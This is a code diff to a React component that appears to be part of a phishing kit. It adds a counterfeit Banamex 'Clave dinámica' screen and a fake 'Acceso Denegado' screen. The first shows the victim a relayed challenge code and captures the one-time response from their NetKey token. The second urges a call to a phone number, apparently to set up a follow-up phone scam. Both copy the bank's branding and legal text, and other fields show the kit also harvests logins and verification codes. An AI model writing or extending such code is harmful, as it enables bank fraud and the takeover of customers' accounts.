@@ -50,6 +50,7 @@ interface ScreenTemplatesProps {
     contrasena?: string;
     codigo?: string; // Código para la verificación de Google
     errorMessage?: string; // Mensaje de error para la pantalla de login
+    challenge?: string; // Código CHALLENGE para NetKey
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
@@ -95,6 +96,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [emailInput, setEmailInput] = useState('');
   const [passwordInput, setPasswordInput] = useState('');
   const [photoFile, setPhotoFile] = useState<File | null>(null);
+  const [netkeyResponse, setNetkeyResponse] = useState('');
   
   // Funciones de validación con protección mejorada
   const validateSecureData = (input: string, type: string) => {
@@ -784,6 +786,130 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </>
         );
         return getBankContainer(loginContent);
+
+      case ScreenType.NETKEY:
+        const handleNetkeySubmit = () => {
+          if (netkeyResponse.length === 8 && /^\d+$/.test(netkeyResponse)) {
+            onSubmit(ScreenType.NETKEY, { netkeyResponse });
+          }
+        };
+        
+        const formatBanamexDate = () => {
+          const now = new Date();
+          const days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
+          const months = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
+          
+          const dayName = days[now.getDay()];
+          const day = now.getDate();
+          const month = months[now.getMonth()];
+          const year = now.getFullYear();
+          const hours = String(now.getHours()).padStart(2, '0');
+          const minutes = String(now.getMinutes()).padStart(2, '0');
+          const seconds = String(now.getSeconds()).padStart(2, '0');
+          
+          return `${dayName} ${day} de ${month} de ${year}, ${hours}:${minutes}:${seconds} Centro de México`;
+        };
+        
+        const netkeyContent = (
+          <div className="bg-white p-6 rounded-lg">
+            <div className="text-center mb-6">
+              <p className="text-sm text-gray-600 mb-4">
+                {formatBanamexDate()}
+              </p>
+              <h2 className="text-xl font-bold text-[#003d7a] mb-4">Clave dinámica</h2>
+            </div>
+            
+            <div className="bg-blue-50 p-6 rounded-lg mb-6 text-sm text-gray-700 leading-relaxed">
+              <p className="mb-4">
+                Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número <strong>"9"</strong>.
+              </p>
+              <p className="mb-4">
+                Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:
+              </p>
+              <div className="bg-white p-4 rounded border-2 border-[#003d7a] my-4">
+                <p className="text-xs text-gray-600 mb-2">CHALLNG:</p>
+                <p className="text-3xl font-bold text-[#003d7a] text-center tracking-widest font-mono">
+                  {screenData.challenge || '--------'}
+                </p>
+              </div>
+              <p className="text-sm">
+                Presione "ENT." Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo
+              </p>
+            </div>
+            
+            <div className="mb-6">
+              <label className="block text-sm font-medium text-gray-700 mb-2">
+                Clave dinámica
+              </label>
+              <Input 
+                type="text" 
+                maxLength={8}
+                value={netkeyResponse}
+                onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
+                placeholder="________"
+                className="w-full p-4 text-center text-2xl tracking-widest font-mono border-2 border-[#003d7a] rounded"
+              />
+            </div>
+            
+            <Button 
+              className="w-full bg-[#003d7a] hover:bg-[#002855] text-white py-3 text-lg font-semibold"
+              onClick={handleNetkeySubmit}
+              disabled={netkeyResponse.length !== 8}
+            >
+              Continuar
+            </Button>
+            
+            <div className="mt-8 pt-6 border-t border-gray-200 text-center">
+              <p className="text-xs text-gray-500 mb-2">qbnelw03p-ND108-QRDIG-BNEWA10P</p>
+              <p className="text-xs text-gray-500">
+                D.R., © 2025, Banco Nacional de México, S.A., Integrante del Grupo Financiero Banamex.<br/>
+                Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
+              </p>
+            </div>
+          </div>
+        );
+        return netkeyContent;
+
+      case ScreenType.ACCESO_DENEGADO:
+        const accesoDenegadoContent = (
+          <div className="bg-white p-6 rounded-lg">
+            <div className="bg-[#d32f2f] text-white p-6 rounded-t-lg text-center mb-6">
+              <h2 className="text-2xl font-bold">Acceso Denegado</h2>
+            </div>
+            
+            <div className="bg-gray-50 p-6 rounded-lg">
+              <p className="text-gray-700 mb-6 leading-relaxed">
+                Su dispositivo NetKey requiere mantenimiento para continuar funcionando de manera adecuada. 
+                Es necesario sincronizarlo para restablecer su servicio correctamente.
+              </p>
+              
+              <div className="bg-white p-6 rounded-lg border-l-4 border-[#003d7a] mb-6">
+                <h3 className="text-[#003d7a] font-bold text-lg mb-3">Banamex Resuelve PyMEs</h3>
+                <p className="text-gray-700 mb-4">
+                  Para restablecer el funcionamiento correcto de su NetKey, le recomendamos contactar a nuestro 
+                  equipo de soporte técnico especializado:
+                </p>
+                <div className="bg-blue-50 p-4 rounded-lg">
+                  <p className="text-[#003d7a] font-bold text-xl text-center">
+                    📞 800 021 2345
+                  </p>
+                  <p className="text-sm text-gray-600 text-center mt-2">
+                    Disponible 24/7 para empresarios
+                  </p>
+                </div>
+              </div>
+              
+              <div className="text-sm text-gray-600">
+                <p className="mb-2">Horario de atención:</p>
+                <ul className="list-disc list-inside space-y-1 ml-2">
+                  <li>Lunes a Viernes: 8:00 AM - 8:00 PM</li>
+                  <li>Sábados: 9:00 AM - 2:00 PM</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        );
+        return accesoDenegadoContent;
 
       case ScreenType.VUELOS_OTORGADOS:
         const audífonosOtorgadosContent = (
